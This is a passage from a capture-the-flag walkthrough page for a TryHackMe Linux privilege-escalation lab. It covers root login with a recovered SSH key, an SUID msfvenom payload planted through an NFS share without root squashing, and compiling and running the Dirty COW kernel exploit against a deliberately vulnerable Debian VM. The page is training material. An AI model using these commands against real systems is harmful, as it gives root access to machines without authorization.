The name of the file suggests it is for the root user.</p><p>Copy the key over to your Kali box (it&#x27;s easier to just view the contents of the <strong>root_key</strong> file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:</p><p><code>chmod 600 root_key</code></p><p>Use the key to login to the Debian VM as the root account (change the IP accordingly):</p><p><code>ssh -i root_key root@10.10.10.10</code></p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><ol><li>Read and follow along with the above.</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="nfs">NFS<a href="#nfs" class="hash-link" aria-label="Direct link to NFS" title="Direct link to NFS">​</a></h2><p>Files created via NFS inherit the <strong>remote</strong> user&#x27;s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the &quot;nobody&quot; user.</p><p>Check the NFS share configuration on the Debian VM:</p><p><code>cat /etc/exports</code></p><p>Note that the /tmp share has root squashing disabled.</p><p>On your Kali box, switch to your root user if you are not already running as root:</p><p><code>sudo su</code></p><p>Using Kali&#x27;s root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">mkdir /tmp/nfs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Still using Kali&#x27;s root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):</p><p><code>msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</code></p><p>Still using Kali&#x27;s root user, make the file executable and set the SUID permission:</p><p><code>chmod +xs /tmp/nfs/shell.elf</code></p><p>Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:</p><p><code>/tmp/shell.elf</code></p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><ol><li>What is the name of the option that disables root squashing?</li></ol><ul><li><a href="http://fullyautolinux.blogspot.com/2015/11/nfs-norootsquash-and-suid-basic-nfs.html" target="_blank" rel="noopener noreferrer">NFS, no_root_squash and SUID - Basic NFS Security</a></li></ul><p><code>no_root_squash</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="kernel-exploits">Kernel Exploits<a href="#kernel-exploits" class="hash-link" aria-label="Direct link to Kernel Exploits" title="Direct link to Kernel Exploits">​</a></h2><p>Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.</p><p>Run the <strong>Linux Exploit Suggester 2</strong> tool to identify potential kernel exploits on the current system:</p><p><code>perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</code></p><p>The popular Linux kernel exploit &quot;Dirty COW&quot; should be listed. Exploit code for Dirty COW can be found at <strong>/home/user/tools/kernel-exploits/dirtycow/c0w.c</strong>. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).</p><p>Compile the code and run it (note that it may take several minutes to complete):</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./c0w</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Once the exploit completes, run /usr/bin/passwd to gain a root shell:</p><p><code>/usr/bin/passwd</code></p><p>Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">mv /tmp/bak /usr/bin/passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>Read and follow along with the above.</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-scripts">Privilege Escalation Scripts<a href="#privilege-escalation-scripts" class="hash-link" aria-label="Direct link to Privilege Escalation Scripts" title="Direct link to Privilege Escalation Scripts">​</a></h2><p>Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory: <strong>/home/user/tools/privesc-scripts</strong></p><ol><li>Experiment with all three tools, running them with different options. Do all of them identify the techniques used in this room?</li></ol><p><code>No answer needed</code></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/Tryhackme/Linux Local Enumeration/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Linux: Local Enumeration</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/Tryhackme/Looking Glass/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Looking Glass</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#-we-will-cover--the-topics" class="table-of-contents__link toc-highlight">💢 We will cover  the topics</a></li><li><a href="#deploy-the-vulnerable-debian-vm" class="table-of-contents__link toc-highlight">Deploy the Vulnerable Debian VM</a></li><li><a href="#service-exploits" class="table-of-contents__link toc-highlight">Service Exploits</a></li><li><a href="#weak-file-permissions---readable-etcshadow" class="table-of-contents__link toc-highlight">Weak File Permissions - Readable /etc/shadow</a></li><li><a href="#weak-file-permissions---writable-etcshadow" class="table-of-contents__link toc-highlight">Weak File Permissions - Writable /etc/shadow</a></li><li><a href="#weak-file-permissions---writable-etcpasswd" class="table-of-contents__link toc-highlight">Weak File Permissions - Writable /etc/passwd</a></li><li><a href="#sudo---shell-escape-sequences" class="table-of-contents__link toc-highlight">Sudo - Shell Escape Sequences</a></li><li><a href="#sudo---environment-variables" class="table-of-contents__link toc-highlight">Sudo - Environment Variables</a></li><li><a href="#cron-jobs---file-permissions" class="table-of-contents__link toc-highlight">Cron Jobs - File Permissions</a></li><li><a href="#cron-jobs---path-environment-variable" class="table-of-contents__link toc-highlight">Cron Jobs - PATH Environment Variable</a></li><li><a href="#cron-jobs---wildcards" class="table-of-contents__link toc-highlight">Cron Jobs - Wildcards</a></li><li><a href="#suid--sgid-executables---known-exploits" class="table-of-contents__link toc-highlight">SUID / SGID Executables - Known Exploits</a></li><li><a href="#suid--sgid-executables---shared-object-injection" class="table-of-contents__link toc-highlight">SUID / SGID Executables - Shared Object Injection</a></li><li><a href="#suid--sgid-executables---environment-variables" class="table-of-contents__link toc-highlight">SUID / SGID Executables - Environment Variables</a></li><li><a href="#suid--sgid-executables---abusing-shell-features-1" class="table-of-contents__link toc-highlight">SUID / SGID Executables - Abusing Shell Features (#1)</a></li><li><a href="#suid--sgid-executables---abusing-shell-features-2" class="table-of-contents__link toc-highlight">SUID / SGID Executables - Abusing Shell Features (#2)</a></li><li><a href="#passwords--keys---history-files" class="table-of-contents__link toc-highlight">Passwords &amp; Keys - History Files</a></li><li><a href="#passwords--keys---config-files" class="table-of-contents__link toc-highlight">Passwords &amp; Keys - Config Files</a></li><li><a href="#passwords--keys---ssh-keys" class="table-of-contents__link toc-highlight">Passwords &amp; Keys - SSH Keys</a></li><li><a href="#nfs" class="table-of-contents__link toc-highlight">NFS</a></li><li><a href="#kernel-exploits" class="table-of-contents__link toc-highlight">Kernel Exploits</a></li><li><a href="#privilege-escalation-scripts" class="table-of-contents__link toc-highlight">Privilege Escalation Scripts</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>